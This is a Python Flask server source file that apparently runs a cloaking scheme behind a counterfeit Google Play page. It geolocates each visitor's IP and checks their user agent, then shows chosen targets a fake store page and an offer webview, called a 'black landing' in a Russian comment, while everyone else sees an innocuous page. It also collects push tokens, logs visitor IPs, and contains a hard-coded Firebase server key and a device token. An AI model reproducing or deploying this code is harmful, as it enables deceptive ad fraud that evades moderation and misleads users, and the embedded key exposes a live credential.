from flask import Flask, jsonify, render_template, request
from pyfcm import FCMNotification
import os, json, datetime, requests

app = Flask(__name__)

@app.route('/test')
def test():
    noti = FCMNotification('AAAADIxId88:APA91bGE7190WvN4ARWEB-VbNaB_0lc3cgnKNeXvVsbfg99yzRZSHhU1Ol3XIsh-EJ-zIs02jyLEzxSYyRi6zoIduut6mFf4ak3I_3MRQzG0azcJXmiQ_rYSKHCttBbDVFom-Ir4aDwa')
    token = request.args.get('token')
    users = ['e_nixA4DoERP1aysm_SrYG:APA91bGMi3eFOEpRIZmzq2idDUWHYb-zCo1ApFuwnIgV_IhN2Lth2JfH5XBPA7lprzuLHsJPvGB799xM9otdB1Dtc3PkVlZy-CQKGh8J19ZwI-bIj2l8W95iEtmhZAthbJfPtGOlzNXQ']
    r = noti.notify_single_device(token, 'Test text notify', 'titl notify test')
    print(r)
    return jsonify({'succes': 'ok'})

@app.route('/offline.html')
def offline():
    return app.send_static_file('offline.html')

@app.route('/service-worker.js')
def sw():
    return app.send_static_file('service-worker.js')

@app.route('/firebase-messaging-sw.js')
def service_messaging_sw():
    return app.send_static_file('firebase-messaging-sw.js')

@app.route('/')
def google_play():
    link_id = request.args.get('link_id')
    
    if (check_user_cloak(request)) and link_id != None:
        log_to_file(request, 'yes')
        return render_template('google.html', link_id=link_id)

    log_to_file(request)
    return render_template('index.html', link_id=link_id)

@app.route('/webview')
def webview():
    offer_list = json.loads(open(os.path.join('offer.json')).read())
    link_id = request.args.get('link_id')

    if check_user_cloak(request):
        log_to_file(request, 'registred')
        return render_template('webview.html', url=offer_list[link_id]["url"])
    
    log_to_file(request)
    return render_template('index.html', link_id=link_id)

@app.route('/manifest.json')
def get_manifest():
    link_id = request.args.get('link_id')

    manifest = json.loads(open(os.path.join('static', 'manifest.json')).read())
    manifest['start_url'] = f'/webview?link_id={link_id}'

    #images apps
    imgs = os.listdir(os.path.join('static', 'app_1'))
    icons = []
    for img in imgs:
        data = {
            "src": os.path.join('static', 'app_1', img),
            "type": "image/png",
            "sizes": img.split('.')[0]
        }
        icons.append(data)
    manifest['icons'] = icons
    return manifest

@app.route('/reg_user', methods=['POST'])
def save_token():
    print('registred token')
    
    print(request.form['token'])
    try:
        os.mkdir('users')
    except:
        pass

    users = os.listdir('users')

    for user in users:
        if request.form['token'].split(':')[0] == user:
            print('Этот токен уже есть в базе')
            return jsonify({'res': 'Уже зареганы'})
    
    file = open(os.path.join('users', request.form['token'].split(':')[0]), 'w')
    file.write(request.form['token'])
    file.close()


    return jsonify({'res': 'Зарегали юзера'})

@app.route('/stat')
def get_stat():
    with open('log.txt', 'r') as f:
        logs = []
        for line in f:
            logs.append(line)
        return render_template('stat.html', logfile=sorted(logs, reverse=True)[:200])

def log_to_file(req: request, mes: str = 'no'):
    with open('log.txt', 'a+') as f:
        r = requests.get(f'https://geolocation-db.com/json/{req.remote_addr}&position=true').json()
        f.write(f'{datetime.datetime.today().strftime("%d.%m.%Y %H:%M:%S")} - {req.remote_addr} ({r["country_code"]}) - {req.user_agent.string} - {mes}\n')
        f.close()

def check_user_cloak(request) -> bool:
    """
    Проверяем можно ли пустить посетителя на черный ленд
    """
    try:
        offer_list = json.loads(open(os.path.join('offer.json')).read())
        link_id = request.args.get('link_id')

        r = requests.get(f'https://geolocation-db.com/json/{request.remote_addr}&position=true').json()

        if (r["country_code"] in offer_list[link_id]["countries"]):
            for ua in offer_list[link_id]["user_agents"]:
                if str(ua).lower() in str(request.user_agent.string).lower():
                    return True
    except Exception as e:
        print(e)
    
    return False



if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
